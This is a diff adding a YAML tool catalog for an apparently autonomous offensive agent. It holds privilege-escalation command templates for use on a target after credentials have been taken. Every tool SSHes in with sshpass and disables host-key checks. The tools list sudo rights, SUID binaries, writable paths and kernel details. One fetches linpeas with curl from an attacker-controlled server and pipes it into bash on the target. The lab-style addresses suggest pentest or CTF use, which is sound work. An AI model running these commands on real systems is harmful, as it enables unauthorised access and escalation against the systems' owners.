@@ -1,0 +1,118 @@
+# Privilege Escalation (TA0004): tools the agent runs against an existing
+# foothold to enumerate or exploit a path to higher privilege. All run via
+# sshpass/SSH into the target with already-obtained credentials.
+
+tools:
+  - name: sudo_list_perms
+    category: post-exploit
+    description: List sudo permissions for the current user.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'sudo -n -l 2>&1'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 15
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0004, TA0007]
+      techniques: [T1078, T1548.003]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      User bob may run the following commands on target:
+          (root) NOPASSWD: /usr/bin/find
+
+  - name: find_suid_binaries
+    category: post-exploit
+    description: Find all SUID binaries on the target.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'find / -perm -u=s -type f 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0004, TA0007]
+      techniques: [T1083, T1548.001]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      /usr/bin/sudo
+      /usr/bin/passwd
+      /usr/bin/find
+
+  - name: find_writable_paths
+    category: post-exploit
+    description: Find directories writable by the current user (PATH abuse candidates).
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'find / -writable -type d 2>/dev/null | head -50'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0004, TA0007]
+      techniques: [T1083]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      /tmp
+      /var/tmp
+      /home/bob
+
+  - name: linpeas_run_remote
+    category: post-exploit
+    description: Run linpeas via a one-liner curl|bash from a Kali HTTP server.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'curl -s http://{lhost}:{lport}/linpeas.sh | bash 2>&1 | tee /tmp/linpeas.out'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: lhost, type: ip, description: Kali HTTP server IP }
+      - { name: lport, type: port, description: Kali HTTP server port, default: 8080 }
+    runtime_cap_seconds: 600
+    output_parser_id: linpeas
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0004, TA0007]
+      techniques: [T1059.004, T1083]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      lhost: 10.10.14.2
+      lport: 8080
+    example_output: |
+      [+] Operative system
+      [+] PATH
+      [+] Date
+      [+] System stats
+      [+] CVEs Check
+        [+] CVE-2021-4034 (PwnKit)
+
+  - name: kernel_exploit_search_remote
+    category: post-exploit
+    description: Read kernel info, then searchsploit it locally on Kali.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'uname -a; cat /etc/os-release 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 15
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0004, TA0007]
+      techniques: [T1082, T1068]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      Linux target 5.10.0-19-amd64 #1 SMP Debian 5.10
+      ID=debian VERSION="11 (bullseye)"
